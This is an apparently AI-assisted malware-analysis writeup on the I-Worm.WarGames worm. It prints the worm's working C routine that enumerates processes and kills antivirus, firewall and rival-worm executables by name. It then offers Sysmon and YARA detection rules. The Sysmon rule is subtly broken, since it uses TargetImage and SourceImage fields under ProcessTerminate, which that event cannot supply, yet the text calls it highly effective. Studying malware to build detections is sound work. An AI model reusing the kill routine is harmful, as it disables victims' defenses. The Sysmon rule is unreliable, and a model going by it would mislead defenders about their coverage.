# I-Worm.WarGames - Mass Antivirus Process Termination

**Repository:** `MalwareSourceCode-main`  
**File:** `Win32/InternetWorm/I-Worm.WarGames.c`  
**Language:** C  
**MITRE ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools), T1057 (Process Discovery)

## Overview

The early 2000s email worm, I-Worm.WarGames, implements an aggressive defense impairment strategy. Upon execution, its first action is to systematically enumerate and terminate a hardcoded list of 18 different security processes. This includes popular antivirus and firewall products of the era, as well as competing malware families. By disabling these security tools before beginning its primary propagation routines, the worm significantly increases its chances of infecting the system and spreading to other victims without being detected or blocked.

## Code Snippet & Analysis

The worm's `WinMain` entry point immediately calls the `StopAV` function for each target process. The `StopAV` function contains the core logic for finding and terminating a process by its name.

```c
#include <windows.h>
#include <tlhelp32.h>

// 1. Main entry point calls StopAV for each target
int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    // --- Kill Antivirus ---
    StopAV("AVP32.EXE");		// AVP (Kaspersky)
    StopAV("AVPCC.EXE");		// AVP
    StopAV("AVPM.EXE");		    // AVP
    StopAV("NAVAPW32.EXE");		// Norton Antivirus
    StopAV("ZONEALARM.EXE");	    // ZoneAlarm Firewall
    
    // --- Kill Competing Worms ---
    StopAV("KERN32.EXE");		// I-Worm.Badtrans
    StopAV("LOAD.EXE");		    // I-Worm.Nimda
    StopAV("SCAM32.EXE");		// I-Worm.Sircam
    // ... and 10 more ...
}

// 2. Function to find and terminate a process by name
void StopAV(char *antivirus)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 uProcess;
    
    // 3. Get a snapshot of all running processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    uProcess.dwSize = sizeof(uProcess);
    
    // 4. Get the first process in the snapshot
    BOOL bProcessFound = Process32First(hSnapshot, &uProcess);

    while(bProcessFound) 
    {
        // 5. Check if the process name matches the target
        if(strstr(uProcess.szExeFile, antivirus) != NULL) 
        {
            // 6. Get a handle to the process with termination rights
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, uProcess.th32ProcessID);
            if(hProcess != NULL) 
            {
                // 7. Terminate the process
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        }
        // Move to the next process in the snapshot
        bProcessFound = Process32Next(hSnapshot, &uProcess);
    }
    CloseHandle(hSnapshot);
}
```

### What it does:

1.  **Hardcoded Target List:** The `WinMain` function begins with a series of calls to `StopAV`, passing a hardcoded string for each security product or rival malware it wants to remove.
2.  **Process Snapshot:** The `StopAV` function calls `CreateToolhelp32Snapshot` with the `TH32CS_SNAPPROCESS` flag to get a list of all processes currently running on the system.
3.  **Process Enumeration:** It walks through the process list using a `while` loop with `Process32First` and `Process32Next`.
4.  **String Matching:** Inside the loop, it uses `strstr` to check if the target name (e.g., "AVP32.EXE") exists within the enumerated process's executable name (`uProcess.szExeFile`).
5.  **Get Process Handle:** If a match is found, it calls `OpenProcess` with the `PROCESS_TERMINATE` access right to get a handle to the target process.
6.  **Terminate Process:** Finally, it calls `TerminateProcess` on the handle, forcefully killing the security software.

### Why it's a TTP:

This is a textbook example of **T1562.001 - Impair Defenses: Disable or Modify Tools**. The malware is not attempting to be subtle; it is directly and forcefully terminating security software that would otherwise detect or block its malicious activity. By enumerating all running processes (`T1057 - Process Discovery`) and comparing them against a known list of targets, the attacker ensures that their malware has a much higher chance of achieving its objectives. This "scorched earth" approach is common in worms and other malware that need to operate unimpeded.

## Detection & Evasion

### Sysmon Rule

A Sysmon rule can provide extremely high-fidelity alerts for this behavior by watching for any `TerminateProcess` event where the target is a known security product.

```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="Antivirus Process Termination" groupRelation="or">
            <ProcessTerminate onmatch="include">
                <!-- Add the names of all critical security tool executables in your environment -->
                <TargetImage condition="image end with">msmpeng.exe</TargetImage> <!-- Windows Defender -->
                <TargetImage condition="image end with">mbam.exe</TargetImage>    <!-- Malwarebytes -->
                <TargetImage condition="image end with">avp.exe</TargetImage>      <!-- Kaspersky -->
                <TargetImage condition="image end with">avgui.exe</TargetImage>    <!-- AVG -->
                <TargetImage condition="image end with">savservice.exe</TargetImage> <!-- Sophos -->
                <!-- Rule: Alert if the process initiating the termination is NOT a known admin tool -->
                <SourceImage condition="not image end with">taskkill.exe</SourceImage>
                <SourceImage condition="not image end with">taskmgr.exe</SourceImage>
            </ProcessTerminate>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Note:** This rule is highly effective. A process being terminated is a normal event, but a security tool being terminated by anything other than a system administrator's tool (`taskkill`, `taskmgr`) is deeply suspicious.

### Yara Rule

A Yara rule can detect this malware by searching for the characteristic block of hardcoded antivirus and worm process names.

```yara
rule TTP_IWorm_WarGames_AV_Termination
{
    meta:
        author = "GitHub Copilot"
        description = "Detects I-Worm.WarGames and similar malware by its hardcoded list of security tools to terminate."
        mitre_ttp = "T1562.001"
        malware = "I-Worm.WarGames"
    strings:
        // Antivirus Targets
        $av1 = "AVP32.EXE" ascii
        $av2 = "AVPCC.EXE" ascii
        $av3 = "NAVAPW32.EXE" ascii
        $av4 = "ZONEALARM.EXE" ascii
        $av5 = "PAVSCHED.EXE" ascii

        // Competing Worm Targets
        $w1 = "KERN32.EXE" ascii // Badtrans
        $w2 = "LOAD.EXE" ascii   // Nimda
        $w3 = "SCAM32.EXE" ascii // Sircam

    condition:
        uint16(0) == 0x5a4d and // PE file
        (4 of ($av*)) and (2 of ($w*))
}
```
**Note:** The condition requires a PE file to contain at least four of the antivirus strings and two of the worm strings, making it a robust signature for this specific malware and its variants.
